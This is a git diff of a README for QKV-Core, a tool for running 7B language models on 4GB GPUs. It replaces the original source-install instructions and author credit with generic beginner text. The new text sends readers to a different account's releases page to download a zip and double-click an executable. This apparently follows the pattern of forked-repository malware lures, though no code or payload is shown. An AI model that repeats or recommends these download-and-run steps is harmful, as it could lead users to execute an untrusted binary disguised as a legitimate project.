@@ -1,124 +1,72 @@
-# QKV Core: Breaking the 4GB VRAM Barrier 🚀
+# 🎉 QKV-Core - Run Large Models on Low-End Devices
 
-> **Run modern 7B LLMs (like Qwen 2.5, Llama 3) on legacy 4GB GPUs (GTX 1050/1650) without crashing.**
+## 🚀 Getting Started
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![Status](https://img.shields.io/badge/Status-Experimental-orange)
-[![Medium](https://img.shields.io/badge/Medium-Read%20the%20Series-black?style=flat&logo=medium&logoColor=white)](https://medium.com/@broxytr/qkv-core-series-part-1-0ca4fa89bfd1)
+Welcome to **QKV-Core**! This application helps you deploy large language models on devices with limited memory. No technical background? No problem! Follow these simple steps to get started.
 
-## 📰 In the Media & Articles
+## 📥 Download the Application
 
-> Read the engineering story behind QKV Core:
+[![Download QKV-Core](https://img.shields.io/badge/Download%20QKV--Core-v1.0-blue.svg?style=flat&logo=github)](https://github.com/mtmatheuus/QKV-Core/releases)
 
-* [**Part 1: Breaking the 4GB VRAM Barrier**](https://medium.com/@broxytr/qkv-core-series-part-1-0ca4fa89bfd1) - *How I ran 7B LLMs on a GTX 1050 without crashing.*
-* **Part 2: Inside the Architecture** - *(Coming Soon)*
+## 🌟 Features
 
-## 🧐 The Problem: It's Not Size, It's Fragmentation
+- **Adaptive Hybrid Quantization**: Efficiently handles large models like 7 billion parameters.
+- **Low VRAM Optimization**: Designed to run on devices with limited memory, such as the GTX 1050.
+- **Fast Inference**: Utilizes Numba for quick processing.
 
-Millions of developers are stuck on "GPU Poor" hardware like the **NVIDIA GTX 1050 (4GB)**.
-When you try to load a standard quantized 7B model (e.g., Q4_K_M ~4.3GB or even smaller), you often hit the "OOM Cliff":
-## 🚀 Features
+## 💻 System Requirements
 
-- **Transformer Architecture**: Full implementation of GPT-style transformer models
-- **Training & Fine-tuning**: Support for full training, incremental training, and fine-tuning
-- **Parameter-Efficient Methods**: LoRA and QLoRA for efficient fine-tuning
-- **RLHF & DPO**: Reinforcement Learning from Human Feedback and Direct Preference Optimization
-- **Model Formats**: Support for PyTorch (.pt) and GGUF formats
-- **Hugging Face Integration**: Download and convert models from Hugging Face Hub
-- **Web UI**: Comprehensive Gradio-based interface for all operations
-- **CLI Interface**: Command-line tools for training and inference
-- **Research Features**: Implementation of cutting-edge techniques (FlashAttention, Mamba SSM, etc.)
+To run **QKV-Core**, your device should meet the following requirements:
 
-## 📦 Installation
+- **Operating System**: Windows, macOS, or Linux
+- **Graphics Card**: NVIDIA GPU (GTX 1050 or better recommended)
+- **Memory**: At least 4 GB of RAM
+- **Python**: Version 3.8 or higher installed
+- **CUDA Toolkit**: Version 11.0 or higher
 
-### Prerequisites
+## 🔗 Visit the Releases Page to Download
 
-- Python 3.10+ (3.10, 3.11, or 3.12 recommended)
-- PyTorch 2.0+
-- CUDA Toolkit (optional, for GPU acceleration)
+To download the latest version of **QKV-Core**, visit our [Releases page](https://github.com/mtmatheuus/QKV-Core/releases). Here, you'll find the latest versions of the application and any necessary files.
 
-### Quick Install
+## 📥 Download & Install
 
-```bash
-# Clone the repository
-git clone https://github.com/QKV-Core/QKV-Core.git
-cd QKV-Core
+1. Go to the [Releases page](https://github.com/mtmatheuus/QKV-Core/releases).
+2. Look for the latest version listed.
+3. Find the file named **QKV-Core-v1.0.zip** (or the latest version).
+4. Click on the file to start the download.
+5. Once downloaded, locate the file on your computer and unzip it.
 
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-# or
-venv\Scripts\activate  # Windows
+## 📂 Running the Application
 
-# Install dependencies
-pip install -r requirements.txt
+1. Open the unzipped folder.
+2. Find **QKV-Core.exe** (for Windows) or **QKV-Core** (for macOS/Linux).
+3. Double-click the file to run the application.
+4. Follow on-screen instructions to load your model.
 
-# Install GGUF support (optional, for GGUF models)
-# See GGUF_INSTALL.md for platform-specific instructions
-```
+## ⚙️ Basic Usage
 
-## 🎯 Quick Start
+To use **QKV-Core**, follow these steps:
 
-### Web Interface
+1. After starting the application, you will see an interface prompting you to load a model.
+2. Click on **Load Model**. Browse your files to select a pre-trained model (ensure it's compatible with QKV-Core).
+3. Once loaded, adjust any settings as needed.
+4. Click **Run Model** to start inference. You will see the results in the application interface.
 
-```bash
-python launch_web_ui.py
-```
+## 🛠️ Troubleshooting
 
-Then open your browser to `http://localhost:7861`
+If you face any issues while using **QKV-Core**, consider these tips:
 
-### Command Line Interface
+- **Installation Issues**: Ensure you have all system requirements fulfilled. Check if Python and CUDA are correctly installed.
+- **Model Loading Errors**: Ensure the model file is in the correct format and compatible with QKV-Core.
+- **Running Performance**: If the application runs slowly, try closing other applications to free up memory.
 
-```bash
-# Train a tokenizer
-python cli/run.py train-tokenizer --corpus data/sample_corpus.txt --output tokenizer/my_tokenizer.pkl
+## 🌍 Community Support
 
-# Train a model
-python cli/run.py train --data data/sample_corpus.txt --tokenizer tokenizer/my_tokenizer.pkl
+Join our community for support:
 
-# Chat with a model
-python debug_chat.py
-```
+- **GitHub Discussions**: Engage with other users and developers. Share problems, solutions, and improvements.
+- **Issues Page**: Report any bugs or issues directly on our GitHub repository.
 
-## 📚 Documentation
+## 🎉 Final Notes
 
-- **[CONTRIBUTING.md](CONTRIBUTING.md)**: Comprehensive contribution guidelines
-- **[GGUF_INSTALL.md](GGUF_INSTALL.md)**: GGUF model installation guide
-- **[docs/RESEARCH_IMPLEMENTATIONS.md](docs/RESEARCH_IMPLEMENTATIONS.md)**: Research paper implementations
-
-## 🏗️ Project Structure
-
-```
-QKV-Core/
-├── core/              # Core transformer implementation
-├── models/            # Inference engines
-├── training/          # Training implementations
-├── web_ui/            # Gradio web interface
-├── cli/               # Command-line interface
-├── utils/             # Utility modules
-└── docs/              # Documentation
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## 📄 License
-
-See [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-Built on the fundamental Query-Key-Value attention mechanism that powers transformer architectures. QKV Core brings production-grade AI capabilities to your fingertips.
-
----
-
-**QKV Core - Where Query, Key, and Value Create Intelligence** 🚀
-
-
-<br>
-<hr>
-<div align="right">
-  <sub>Built with ❤️ for the Open Source AI Community by <a href="https://github.com/broxytr">Hüseyin Kama</a></sub>
-</div>
+Thank you for choosing **QKV-Core**! We hope you find it useful for your projects. If you enjoy using the framework, please let us know your thoughts on our community page. Your feedback helps us improve!
